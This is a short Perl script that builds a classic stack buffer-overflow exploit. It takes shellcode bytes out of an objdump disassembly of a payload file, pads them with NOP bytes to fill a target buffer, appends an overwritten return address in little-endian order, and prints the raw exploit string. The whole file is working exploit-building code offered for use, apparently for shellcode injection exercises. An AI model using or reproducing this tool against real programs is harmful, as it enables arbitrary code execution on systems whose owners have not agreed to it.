#!/bin/perl

use strict;
use warnings;
use Getopt::Long;

my $pl;     # Payload
my $ip;     # Instruction pointer
my $bl;     # Buffer length
my $le = 1; # Little-endian ?

GetOptions (
    "pl=s" => \$pl,
    "ip=s" => \$ip,
    "bl=i" => \$bl,
    "le=i" => \$le,
) or exit 1;

die "Missing payload\n" unless $pl;
die "Missing istruction pointer\n" unless $ip;
die "Missing buffer length\n" unless $bl;

my $hex_pl = "";
for (`objdump -d $pl`) {
    if (/^\s*[0-9a-f]+:\s+((?:[0-9a-f]{2}\s)+)/) {
        $hex_pl = $hex_pl . $_ foreach (split / /, $1)
    }
}

my $garbage_length = $bl + 9 - length($hex_pl) / 2;
die "Buffer is not large enough.\n" if ($garbage_length < 0);

$ip =~ s/^0x//;
$ip = "0" . $ip if length($ip) % 2 != 0;

if ($le) {
  my @bytes = ($ip =~ /../g);
  my @le = reverse @bytes;
  $ip = join("", @le);
}

print pack("H*", $hex_pl . "90" x $garbage_length . $ip);
